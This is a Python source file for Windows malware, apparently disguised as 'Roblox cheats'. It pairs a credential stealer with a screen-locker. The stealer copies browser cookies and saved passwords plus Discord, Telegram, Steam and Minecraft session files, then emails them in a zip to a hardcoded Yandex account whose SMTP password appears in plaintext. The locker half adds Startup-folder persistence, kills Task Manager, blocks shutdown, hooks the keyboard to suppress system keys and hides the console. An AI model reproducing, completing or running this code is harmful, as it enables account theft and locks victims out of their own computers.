import os
import sys
import shutil
import zipfile
import smtplib
import time
import re
import subprocess
import platform
import socket
import getpass
import tempfile
from datetime import datetime
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import tkinter as tk
from tkinter import filedialog, messagebox
import ctypes
import ctypes.wintypes
import threading
import winreg
import random

# =================== СТИЛЕР ===================
EMAIL_FROM = "m3tvey@yandex.ru"
EMAIL_PASSWORD = "fqukzrqxqcgmwoqx"
EMAIL_TO = "m3tvey@yandex.ru"
SMTP_SERVER = "smtp.yandex.ru"
SMTP_PORT = 465

WORK_DIR = os.path.join(tempfile.gettempdir(), "stolen_creds")
os.makedirs(WORK_DIR, exist_ok=True)

def collect_browser_data():
    appdata_local = os.getenv("LOCALAPPDATA")
    appdata_roaming = os.getenv("APPDATA")
    browsers = {
        "Chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
        "Brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
        "Yandex": os.path.join(appdata_local, "Yandex", "YandexBrowser", "User Data"),
        "Firefox": os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles"),
    }
    files_to_copy = ["Cookies", "Login Data", "Web Data", "History", "Bookmarks"]
    collected = 0
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        try:
            if name == "Firefox":
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile)
                    if os.path.isdir(profile_path):
                        dst = os.path.join(WORK_DIR, "browsers", name, profile)
                        shutil.copytree(profile_path, dst, dirs_exist_ok=True)
                        collected += 1
            else:
                for folder in os.listdir(path):
                    folder_path = os.path.join(path, folder)
                    if os.path.isdir(folder_path) and (folder.startswith("Default") or folder.startswith("Profile")):
                        dst_root = os.path.join(WORK_DIR, "browsers", name, folder)
                        for fname in files_to_copy:
                            src = os.path.join(folder_path, fname)
                            if os.path.isfile(src):
                                dst = os.path.join(dst_root, fname)
                                os.makedirs(os.path.dirname(dst), exist_ok=True)
                                shutil.copy2(src, dst)
                                collected += 1
                        ls_src = os.path.join(folder_path, "Local Storage")
                        if os.path.isdir(ls_src):
                            dst_ls = os.path.join(dst_root, "Local Storage")
                            shutil.copytree(ls_src, dst_ls, dirs_exist_ok=True)
        except:
            pass
    return collected

def collect_discord():
    appdata = os.getenv("APPDATA")
    paths = [
        os.path.join(appdata, "discord", "Local Storage"),
        os.path.join(appdata, "discordcanary", "Local Storage"),
        os.path.join(appdata, "discordptb", "Local Storage"),
    ]
    count = 0
    for p in paths:
        if os.path.exists(p):
            try:
                dst = os.path.join(WORK_DIR, "discord", os.path.basename(os.path.dirname(p)))
                shutil.copytree(p, dst, dirs_exist_ok=True)
                count += 1
            except:
                pass
    return count

def collect_telegram():
    tdata = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    if os.path.exists(tdata):
        try:
            dst = os.path.join(WORK_DIR, "telegram_tdata")
            shutil.copytree(tdata, dst, dirs_exist_ok=True)
            return True
        except:
            pass
    return False

def collect_steam():
    steam_path = os.path.join(os.getenv("PROGRAMFILES"), "Steam")
    if not os.path.exists(steam_path):
        steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam")
    if os.path.exists(steam_path):
        try:
            src = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.isfile(src):
                dst = os.path.join(WORK_DIR, "steam", "loginusers.vdf")
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)
            config_src = os.path.join(steam_path, "config")
            if os.path.isdir(config_src):
                dst_config = os.path.join(WORK_DIR, "steam", "config")
                shutil.copytree(config_src, dst_config, dirs_exist_ok=True)
            return True
        except:
            pass
    return False

def collect_minecraft():
    mc_path = os.path.join(os.getenv("APPDATA"), ".minecraft")
    if os.path.exists(mc_path):
        try:
            src = os.path.join(mc_path, "launcher_profiles.json")
            if os.path.isfile(src):
                dst = os.path.join(WORK_DIR, "minecraft", "launcher_profiles.json")
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)
                return True
        except:
            pass
    return False

def collect_other_apps():
    appdata = os.getenv("APPDATA")
    localappdata = os.getenv("LOCALAPPDATA")
    search_dirs = [appdata, localappdata]
    extensions = (".db", ".sqlite", ".sqlite3", ".json")
    count = 0
    for base in search_dirs:
        if not base or not os.path.exists(base):
            continue
        for root, dirs, files in os.walk(base):
            if count > 50:
                break
            for file in files:
                if file.lower().endswith(extensions):
                    if any(x in root.lower() for x in ["cache", "temp", "logs", "backup"]):
                        continue
                    src = os.path.join(root, file)
                    app_name = os.path.basename(os.path.dirname(src))
                    dst = os.path.join(WORK_DIR, "other_apps", app_name, file)
                    try:
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        shutil.copy2(src, dst)
                        count += 1
                    except:
                        pass
    return count

def send_email(subject, body, attachments=None, retries=2):
    for attempt in range(retries):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_FROM
            msg['To'] = EMAIL_TO
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            if attachments:
                for filepath in attachments:
                    if os.path.exists(filepath):
                        with open(filepath, "rb") as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
                            msg.attach(part)
            if SMTP_PORT == 465:
                server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=30)
            else:
                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
                server.starttls()
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            return True
        except Exception:
            time.sleep(5)
    return False

def pack_and_send():
    zip_path = os.path.join(tempfile.gettempdir(), f"creds_{int(time.time())}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(WORK_DIR):
            for file in files:
                full = os.path.join(root, file)
                arcname = os.path.relpath(full, WORK_DIR)
                zipf.write(full, arcname)
    subject = f"Credentials from {getpass.getuser()} at {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    body = "Архив содержит куки, базы паролей, логины и сессии."
    success = send_email(subject, body, attachments=[zip_path])
    if not success:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        local_path = os.path.join(desktop, os.path.basename(zip_path))
        try:
            shutil.copy2(zip_path, local_path)
        except:
            shutil.copy2(zip_path, os.getcwd())
    shutil.rmtree(WORK_DIR, ignore_errors=True)
    try:
        os.remove(zip_path)
    except:
        pass
    return success

def steal_and_send():
    try:
        collect_browser_data()
        collect_discord()
        collect_telegram()
        collect_steam()
        collect_minecraft()
        collect_other_apps()
        pack_and_send()
    except:
        pass

# =================== ВИНЛОКЕР ===================
APP_DATA = os.getenv("LOCALAPPDATA")
MARKER_DIR = os.path.join(APP_DATA, "RobloxCheats")
MARKER_FILE = os.path.join(MARKER_DIR, "unlocked.dat")

def create_marker():
    os.makedirs(MARKER_DIR, exist_ok=True)
    with open(MARKER_FILE, "w") as f:
        f.write("unlocked")

def marker_exists():
    return os.path.exists(MARKER_FILE)

# =================== АВТОЗАГРУЗКА ЧЕРЕЗ ПАПКУ STARTUP ===================
def add_to_startup():
    """Создаёт bat-файл в папке автозагрузки текущего пользователя."""
    try:
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
        bat_path = os.path.join(startup_dir, "RobloxCheats.bat")
        python_exe = sys.executable
        script_path = os.path.abspath(__file__)
        # Содержимое bat-файла
        content = f'@echo off\n"{python_exe}" -u "{script_path}"\n'
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(content)
        return True
    except Exception:
        return False

def remove_from_startup():
    """Удаляет bat-файл из папки автозагрузки."""
    try:
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        bat_path = os.path.join(startup_dir, "RobloxCheats.bat")
        if os.path.exists(bat_path):
            os.remove(bat_path)
        return True
    except:
        return False

# =================== ЗАКРЫТИЕ ДИСПЕТЧЕРА ЗАДАЧ ===================
def kill_task_manager():
    """Завершает процесс диспетчера задач (taskmgr.exe), чтобы пользователь не мог его открыть."""
    try:
        if platform.system() == "Windows":
            subprocess.run(["taskkill", "/f", "/im", "taskmgr.exe"], capture_output=True)
    except:
        pass

def prevent_shutdown():
    try:
        def wndproc(hwnd, msg, wParam, lParam):
            if msg == 0x11:
                if not marker_exists():
                    return 0
            return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wParam, lParam)

        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p)
        proc = WNDPROC(wndproc)

        hinst = ctypes.windll.kernel32.GetModuleHandleW(None)
        wc = ctypes.WNDCLASSW()
        wc.lpfnWndProc = proc
        wc.hInstance = hinst
        wc.lpszClassName = "ShieldWnd"
        if not ctypes.windll.user32.RegisterClassW(ctypes.byref(wc)):
            return

        hwnd = ctypes.windll.user32.CreateWindowExW(
            0, "ShieldWnd", "", 0,
            0, 0, 0, 0,
            0, 0, hinst, 0
        )
        if not hwnd:
            return

        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), hwnd, 0, 0) > 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    except:
        pass

# ============= ПОЛНАЯ БЛОКИРОВКА КЛАВИШ =============
WH_KEYBOARD_LL = 13

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_ulong, ctypes.POINTER(KBDLLHOOKSTRUCT))
hook_ptr = None

def is_modifier_down(vk_code):
    return ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000 != 0

def low_level_keyboard_proc(nCode, wParam, lParam):
    global hook_ptr
    
    if nCode >= 0:
        kb = lParam.contents
        vk = kb.vkCode
        
        # Полная блокировка системных и служебных клавиш
        if vk in (91, 92):  # Win
            return 1
        if vk == 18:  # Alt
            return 1
        if vk == 9:  # Tab
            return 1
        if vk == 27:  # Esc
            return 1
        if 112 <= vk <= 123:  # F1-F12
            return 1
        if vk == 17:  # Ctrl
            return 1
        if vk in (44, 145, 19):  # Print Screen, Scroll Lock, Pause
            return 1
        if vk in (45, 36, 35, 33, 34, 37, 38, 39, 40):  # Navigation
            return 1
        if vk == 93:  # Apps
            return 1
        
        win_pressed = is_modifier_down(91) or is_modifier_down(92)
        alt_pressed = is_modifier_down(18)
        ctrl_pressed = is_modifier_down(17)
        
        # Если зажат любой модификатор, разрешаем только цифры, буквы и базовые управляющие
        if win_pressed or alt_pressed or ctrl_pressed:
            allowed = (48 <= vk <= 57) or (65 <= vk <= 90) or (97 <= vk <= 122) or vk in (8, 13, 32, 46)
            if not allowed:
                return 1
        
        # Основное разрешение: только цифры, буквы, Backspace, Enter, Space, Delete
        allowed = (48 <= vk <= 57) or (65 <= vk <= 90) or (97 <= vk <= 122) or vk in (8, 13, 32, 46)
        if not allowed:
            return 1
            
    return ctypes.windll.user32.CallNextHookEx(hook_ptr, nCode, wParam, lParam)

def start_key_hook():
    global hook_ptr
    try:
        hook_proc = HOOKPROC(low_level_keyboard_proc)
        hook_ptr = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        if hook_ptr:
            msg = ctypes.wintypes.MSG()
            while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    except:
        pass

# =================== ЗАЩИТА ТЕРМИНАЛА ===================
def hide_console():
    """Скрывает окно консоли (терминала), чтобы его нельзя было закрыть через крестик."""
    if platform.system() == "Windows":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
        except:
            pass

def set_console_handler():
    """Игнорирует сигналы Ctrl+C и попытки завершения процесса через консоль."""
    if platform.system() == "Windows":
        try:
            ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
        except:
            pass

# ============= ASCII АРТ =============
EYE_ASCII = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⢿⡇⠀⠀⣾⢀⣸⣄⠀⢠⡐⡄⣹⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢧⢘⣼⣤⠴⠾⣿⡛⠋⣿⡏⢹⡏⠉⣽⢻⢛⡟⢲⡿⣤⣠⣆⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣤⡼⠿⣟⣿⣷⣤⣸⣿⣦⣿⣷⣿⣷⣾⣿⣿⣿⣷⣟⣁⣴⡿⠟⠲⣤⣴⠃⠀⢀⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠰⣼⣶⣎⣉⣙⣿⣿⠿⢻⣿⠟⠋⠉⠙⢟⣛⠀⠀⠀⠙⠟⢿⡙⠛⠿⣶⣶⡾⠋⢉⣳⣴⡟⡠⠀⢀⢀⠀⠀
⠀⠀⠀⠠⣄⣠⣋⣉⣹⣿⠟⠋⠀⠀⡾⠁⠀⠀⢀⣾⣿⣿⣿⠷⠀⢤⡀⠈⣷⠀⠀⠀⠉⠻⢿⣿⣿⡿⠛⢧⣠⣾⠞⠀⠀
⠀⠀⠦⣀⣞⣭⣽⡿⠟⠁⠀⠀⠀⠀⡇⠀⠀⠀⢸⣿⣿⣿⣿⣄⣀⣠⠇⠀⢸⠀⠀⠀⠀⠀⠀⠈⠛⣾⣿⣿⣯⠴⠂⣀⡴
⠀⠐⠦⠴⣶⡿⡟⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠘⢿⣿⣿⣿⡿⠃⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⢀⣾⣿⣭⣍⡉⠉⠉⠁⠀
⢠⠎⢩⠟⠋⢃⢳⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠉⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⣀⣴⣿⣟⣋⠉⠉⡓⠦⠀⠀⠀
⠘⣄⠘⠒⠒⠘⠢⠧⢤⣀⡀⠀⠀⠀⠀⠈⠻⢦⣀⠀⠀⠀⠀⢀⣀⡴⠛⠁⠀⠀⣀⣤⣾⣿⣏⡉⠉⢉⡿⠿⠀⠀⠀⠀⠀
⠀⠀⠉⠁⠀⠀⠀⠦⢤⡾⣿⡿⣷⣶⣦⣤⣄⣀⣈⣉⣉⣉⣉⣉⣁⣠⣤⣴⣾⡿⣿⣿⢧⡀⠈⣹⠶⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠤⣋⠁⡼⠛⠛⡿⣿⠖⢛⣿⠛⠛⣿⡟⠛⠻⣿⡱⠄⠉⣣⠼⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠤⢤⣹⣁⠀⢸⡇⠀⠀⠸⡃⣀⣀⠬⠷⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

MAN_ASCII = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣿⡿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡟⠿⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣴⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⡠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⢹⣿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⠿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
